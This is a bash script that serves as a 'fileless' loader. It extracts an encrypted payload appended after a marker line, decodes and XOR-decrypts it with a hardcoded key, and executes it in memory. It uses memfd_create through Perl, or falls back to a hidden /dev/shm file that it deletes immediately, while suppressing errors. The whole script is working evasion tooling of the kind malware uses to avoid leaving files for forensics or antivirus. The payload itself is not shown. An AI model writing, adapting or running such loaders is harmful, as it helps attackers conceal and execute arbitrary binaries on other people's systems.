#!/bin/bash
# Fileless wrapper - uses memfd_create (NO file created on any filesystem)
# Falls back to /dev/shm + immediate delete if kernel doesn't support memfd_create

set -e

PAYLOAD_LINE=$(grep -n "^__PAYLOAD__$" "$0" | head -1 | cut -d: -f1)
[ -z "$PAYLOAD_LINE" ] && { echo "[-] Corrupted wrapper" >&2; exit 1; }

echo -n "[*] Decrypting payload...   0%" >&2

# Decrypt payload to stdout
decrypt_payload() {
    tail -n +$((PAYLOAD_LINE + 1)) "$0" | python -c 'import sys, os

sys.stderr.write("[*] Loading encrypted payload...\n")
sys.stderr.flush()

key_hex = "1458c8c39db24bc4196b1a139c9674a00759a9d4330c1cd08c2c7f3c3b31ec83"
key = "".join([chr(int(key_hex[i:i+2],16)) for i in range(0,64,2)])

# Read stdin in chunks with progress (avoid long blocking with no output)
chunks = []
total_read = 0
while True:
    chunk = sys.stdin.read(1048576)
    if not chunk:
        break
    chunks.append(chunk)
    total_read += len(chunk)
    sys.stderr.write("\r[*] Reading payload... %d MB" % (total_read // 1048576))
    sys.stderr.flush()

b64 = "".join(chunks).replace("\n","").replace("\r","")
total = len(b64)

sys.stderr.write("\r[*] Decoding payload...   0%%")
sys.stderr.flush()

chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
d = {}
for i in range(64): d[chars[i]] = i
data = []
for i in range(0, len(b64), 4):
    if i % 400000 == 0:
        pct = (i * 100) // total
        sys.stderr.write("\r[*] Decoding payload... %3d%%" % pct)
        sys.stderr.flush()
    n = d.get(b64[i],0) << 18
    n += d.get(b64[i+1],0) << 12
    c2 = b64[i+2] if i+2 < len(b64) else "="
    c3 = b64[i+3] if i+3 < len(b64) else "="
    if c2 != "=": n += d.get(c2,0) << 6
    if c3 != "=": n += d.get(c3,0)
    data.append(chr((n>>16)&255))
    if c2 != "=": data.append(chr((n>>8)&255))
    if c3 != "=": data.append(chr(n&255))
data = "".join(data)
total_b = len(data)
dec = []
for i in range(len(data)):
    if i % 400000 == 0:
        pct = (i * 100) // total_b
        sys.stderr.write("\r[*] Decrypting payload... %3d%%" % pct)
        sys.stderr.flush()
    dec.append(chr(ord(data[i])^ord(key[i%32])))
sys.stderr.write("\r[+] Ready! Launching...        \n")
sys.stderr.flush()
sys.stdout.write("".join(dec))
'
}

# Method 1: memfd_create via Perl (completely fileless - no file on any path)
# syscall 319 = memfd_create on x86_64 Linux
try_memfd_exec() {
    decrypt_payload | perl -e '
use strict;
use POSIX;

# Read binary from stdin
binmode(STDIN);
my $binary = do { local $/; <STDIN> };

# memfd_create syscall (319 on x86_64)
# Creates anonymous memory file - NEVER appears on any filesystem
my $fd = syscall(319, "exec", 1);  # MFD_CLOEXEC = 1
if ($fd < 0) {
    exit 1;  # memfd_create not supported
}

# Write binary to memfd
open(my $fh, ">&=", $fd) or exit 1;
binmode($fh);
print $fh $binary;
close($fh);

# Execute via /proc/self/fd/$fd
my $fd_path = "/proc/self/fd/$fd";
exec {$fd_path} $fd_path, @ARGV;
' -- "$@"
}

# Method 2: Fallback - /dev/shm + open fd + immediate delete
try_shm_exec() {
    TEMP_FILE=/dev/shm/.x$$
    decrypt_payload > "$TEMP_FILE"
    chmod +x "$TEMP_FILE"
    exec 3<"$TEMP_FILE"
    rm -f "$TEMP_FILE"
    exec /proc/self/fd/3 "$@"
}

# Try memfd first (truly fileless), fallback to shm+delete
try_memfd_exec "$@" 2>/dev/null || try_shm_exec "$@"

